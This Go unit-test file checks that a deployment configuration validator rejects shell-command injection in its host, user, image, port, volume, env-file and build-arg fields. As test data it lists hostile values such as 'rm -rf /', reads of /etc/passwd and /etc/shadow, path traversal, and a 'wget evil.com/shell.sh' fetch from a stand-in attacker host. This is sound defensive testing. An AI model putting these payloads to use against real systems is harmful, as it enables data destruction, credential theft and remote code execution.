package config

import (
	"strings"
	"testing"
)

func TestValidate_RequiredFields(t *testing.T) {
	tests := []struct {
		name    string
		config  Config
		wantErr bool
		errMsg  string
	}{
		{
			name:    "empty config",
			config:  Config{},
			wantErr: true,
			errMsg:  "host is required",
		},
		{
			name: "missing user",
			config: Config{
				Host: "example.com",
			},
			wantErr: true,
			errMsg:  "user is required",
		},
		{
			name: "valid minimal config",
			config: Config{
				Host: "example.com",
				User: "deploy",
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.Validate()
			if tt.wantErr {
				if err == nil {
					t.Errorf("Validate() expected error containing %q, got nil", tt.errMsg)
					return
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Validate() error = %q, want error containing %q", err.Error(), tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("Validate() unexpected error = %v", err)
				}
			}
		})
	}
}

func TestValidate_HostFormat(t *testing.T) {
	tests := []struct {
		name    string
		host    string
		wantErr bool
	}{
		{"valid hostname", "example.com", false},
		{"valid subdomain", "api.example.com", false},
		{"valid hyphen", "my-server.example.com", false},
		{"valid IP", "192.168.1.1", false},
		{"valid localhost", "localhost", false},
		{"invalid semicolon injection", "example.com; rm -rf /", true},
		{"invalid pipe injection", "example.com | cat /etc/passwd", true},
		{"invalid backtick injection", "example.com`whoami`", true},
		{"invalid dollar injection", "example.com$(whoami)", true},
		{"invalid newline injection", "example.com\nmalicious", true},
		{"invalid spaces", "example .com", true},
		{"starts with hyphen", "-example.com", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host: tt.host,
				User: "deploy",
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for host %q, got nil", tt.host)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for host %q: %v", tt.host, err)
			}
		})
	}
}

func TestValidate_UserFormat(t *testing.T) {
	tests := []struct {
		name    string
		user    string
		wantErr bool
	}{
		{"valid user", "deploy", false},
		{"valid underscore start", "_deploy", false},
		{"valid with numbers", "deploy123", false},
		{"valid with hyphen", "deploy-user", false},
		{"valid with underscore", "deploy_user", false},
		{"invalid uppercase", "Deploy", true},
		{"invalid semicolon", "deploy; whoami", true},
		{"invalid backtick", "deploy`id`", true},
		{"invalid dollar", "deploy$(id)", true},
		{"invalid spaces", "deploy user", true},
		{"starts with number", "123deploy", true},
		{"starts with hyphen", "-deploy", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host: "example.com",
				User: tt.user,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for user %q, got nil", tt.user)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for user %q: %v", tt.user, err)
			}
		})
	}
}

func TestValidate_ImageAndTag(t *testing.T) {
	tests := []struct {
		name    string
		image   string
		tag     string
		wantErr bool
	}{
		{"valid image and tag", "myapp", "latest", false},
		{"valid with registry", "registry.example.com/myapp", "v1.0.0", false},
		{"valid with dots", "my.app", "1.0.0", false},
		{"valid with hyphens", "my-app", "v1-beta", false},
		{"valid with underscores", "my_app", "v1_0", false},
		{"invalid image semicolon", "myapp; rm -rf /", "latest", true},
		{"invalid tag semicolon", "myapp", "latest; whoami", true},
		{"invalid image backtick", "myapp`id`", "latest", true},
		{"invalid tag backtick", "myapp", "`id`", true},
		{"invalid image dollar", "myapp$(id)", "latest", true},
		{"invalid tag dollar", "myapp", "$(id)", true},
		{"invalid image uppercase", "MyApp", "latest", true},
		{"image starts with hyphen", "-myapp", "latest", true},
		{"tag starts with hyphen", "myapp", "-latest", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:  "example.com",
				User:  "deploy",
				Image: tt.image,
				Tag:   tt.tag,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for image=%q tag=%q, got nil", tt.image, tt.tag)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for image=%q tag=%q: %v", tt.image, tt.tag, err)
			}
		})
	}
}

func TestValidate_Platform(t *testing.T) {
	tests := []struct {
		name     string
		platform string
		wantErr  bool
	}{
		{"valid linux/amd64", "linux/amd64", false},
		{"valid linux/arm64", "linux/arm64", false},
		{"valid linux/arm/v7", "linux/arm/v7", false},
		{"empty platform", "", false}, // Empty is allowed (uses default)
		{"invalid platform", "windows/amd64", true},
		{"injection attempt", "linux/amd64; whoami", true},
		{"random string", "foobar", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:     "example.com",
				User:     "deploy",
				Platform: tt.platform,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for platform %q, got nil", tt.platform)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for platform %q: %v", tt.platform, err)
			}
		})
	}
}

func TestValidate_Ports(t *testing.T) {
	tests := []struct {
		name          string
		containerPort string
		hostPort      string
		wantErr       bool
	}{
		{"valid ports", "3000", "8080", false},
		{"valid port 1", "1", "1", false},
		{"valid port 65535", "65535", "65535", false},
		{"empty ports", "", "", false}, // Empty is allowed
		{"invalid container port 0", "0", "3000", true},
		{"invalid host port 0", "3000", "0", true},
		{"invalid container port 65536", "65536", "3000", true},
		{"invalid host port 65536", "3000", "65536", true},
		{"invalid container port string", "abc", "3000", true},
		{"invalid host port string", "3000", "abc", true},
		{"injection in container port", "3000; whoami", "8080", true},
		{"injection in host port", "3000", "8080; whoami", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:          "example.com",
				User:          "deploy",
				ContainerPort: tt.containerPort,
				HostPort:      tt.hostPort,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for containerPort=%q hostPort=%q, got nil", tt.containerPort, tt.hostPort)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for containerPort=%q hostPort=%q: %v", tt.containerPort, tt.hostPort, err)
			}
		})
	}
}

func TestValidate_BuildArgs(t *testing.T) {
	tests := []struct {
		name      string
		buildArgs map[string]string
		wantErr   bool
	}{
		{"valid build args", map[string]string{"VERSION": "1.0.0", "ENV": "prod"}, false},
		{"valid with underscore", map[string]string{"MY_VAR": "value"}, false},
		{"empty build args", nil, false},
		{"invalid key with hyphen", map[string]string{"MY-VAR": "value"}, true},
		{"invalid key starts with number", map[string]string{"1VAR": "value"}, true},
		{"invalid value semicolon", map[string]string{"VAR": "value; whoami"}, true},
		{"invalid value backtick", map[string]string{"VAR": "`whoami`"}, true},
		{"invalid value dollar", map[string]string{"VAR": "$(whoami)"}, true},
		{"invalid value pipe", map[string]string{"VAR": "value | cat"}, true},
		{"invalid value newline", map[string]string{"VAR": "value\nmalicious"}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:      "example.com",
				User:      "deploy",
				BuildArgs: tt.buildArgs,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for buildArgs %v, got nil", tt.buildArgs)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for buildArgs %v: %v", tt.buildArgs, err)
			}
		})
	}
}

func TestValidate_Volumes(t *testing.T) {
	tests := []struct {
		name    string
		volumes []string
		wantErr bool
	}{
		{"valid volume", []string{"/host/path:/container/path"}, false},
		{"valid multiple volumes", []string{"/data:/data", "/logs:/logs"}, false},
		{"empty volumes", nil, false},
		{"missing colon", []string{"/host/path"}, true},
		{"path traversal", []string{"../../../etc/passwd:/data"}, true},
		{"semicolon injection", []string{"/data:/data; rm -rf /"}, true},
		{"backtick injection", []string{"/data`whoami`:/data"}, true},
		{"dollar injection", []string{"/data$(id):/data"}, true},
		{"pipe injection", []string{"/data | cat:/data"}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:    "example.com",
				User:    "deploy",
				Volumes: tt.volumes,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for volumes %v, got nil", tt.volumes)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for volumes %v: %v", tt.volumes, err)
			}
		})
	}
}

func TestValidate_EnvFile(t *testing.T) {
	tests := []struct {
		name    string
		envFile string
		wantErr bool
	}{
		{"valid relative path", ".env", false},
		{"valid nested path", "config/.env.prod", false},
		{"empty env file", "", false},
		{"path traversal", "../../../etc/passwd", true},
		{"absolute path", "/etc/passwd", true},
		{"semicolon injection", ".env; cat /etc/passwd", true},
		{"backtick injection", ".env`whoami`", true},
		{"dollar injection", ".env$(id)", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:    "example.com",
				User:    "deploy",
				EnvFile: tt.envFile,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for envFile %q, got nil", tt.envFile)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for envFile %q: %v", tt.envFile, err)
			}
		})
	}
}

func TestValidate_Network(t *testing.T) {
	tests := []struct {
		name    string
		network string
		wantErr bool
	}{
		{"valid network", "mynetwork", false},
		{"valid with hyphen", "my-network", false},
		{"valid with underscore", "my_network", false},
		{"empty network", "", false},
		{"semicolon injection", "network; whoami", true},
		{"backtick injection", "network`id`", true},
		{"dollar injection", "network$(id)", true},
		{"starts with hyphen", "-network", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:    "example.com",
				User:    "deploy",
				Network: tt.network,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for network %q, got nil", tt.network)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for network %q: %v", tt.network, err)
			}
		})
	}
}

func TestValidate_CPUsAndMemory(t *testing.T) {
	tests := []struct {
		name    string
		cpus    string
		memory  string
		wantErr bool
	}{
		{"valid cpus and memory", "0.5", "512m", false},
		{"valid integer cpus", "2", "1g", false},
		{"empty values", "", "", false},
		{"invalid cpus format", "abc", "512m", true},
		{"invalid memory format", "0.5", "abc", true},
		{"cpus injection", "0.5; whoami", "512m", true},
		{"memory injection", "0.5", "512m; whoami", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{
				Host:   "example.com",
				User:   "deploy",
				CPUs:   tt.cpus,
				Memory: tt.memory,
			}
			err := cfg.Validate()
			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error for cpus=%q memory=%q, got nil", tt.cpus, tt.memory)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error for cpus=%q memory=%q: %v", tt.cpus, tt.memory, err)
			}
		})
	}
}

func TestValidate_CommandInjectionPrevention(t *testing.T) {
	// These are the most critical tests - ensuring command injection is blocked
	injectionPayloads := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"& wget evil.com/shell.sh",
		"`whoami`",
		"$(id)",
		"$PATH",
		"\n/bin/sh",
		"\r\nmalicious",
		"'; DROP TABLE users; --",
		"\"$(cat /etc/shadow)\"",
		"${IFS}cat${IFS}/etc/passwd",
		"<(cat /etc/passwd)",
		">(cat /etc/passwd)",
		"{cat,/etc/passwd}",
	}

	for _, payload := range injectionPayloads {
		t.Run("injection_in_host_"+payload[:min(len(payload), 20)], func(t *testing.T) {
			cfg := Config{
				Host: "example.com" + payload,
				User: "deploy",
			}
			if err := cfg.Validate(); err == nil {
				t.Errorf("Validate() should reject host with injection payload: %q", payload)
			}
		})

		t.Run("injection_in_user_"+payload[:min(len(payload), 20)], func(t *testing.T) {
			cfg := Config{
				Host: "example.com",
				User: "deploy" + payload,
			}
			if err := cfg.Validate(); err == nil {
				t.Errorf("Validate() should reject user with injection payload: %q", payload)
			}
		})

		t.Run("injection_in_build_arg_"+payload[:min(len(payload), 20)], func(t *testing.T) {
			cfg := Config{
				Host:      "example.com",
				User:      "deploy",
				BuildArgs: map[string]string{"VAR": payload},
			}
			if err := cfg.Validate(); err == nil {
				t.Errorf("Validate() should reject build arg with injection payload: %q", payload)
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
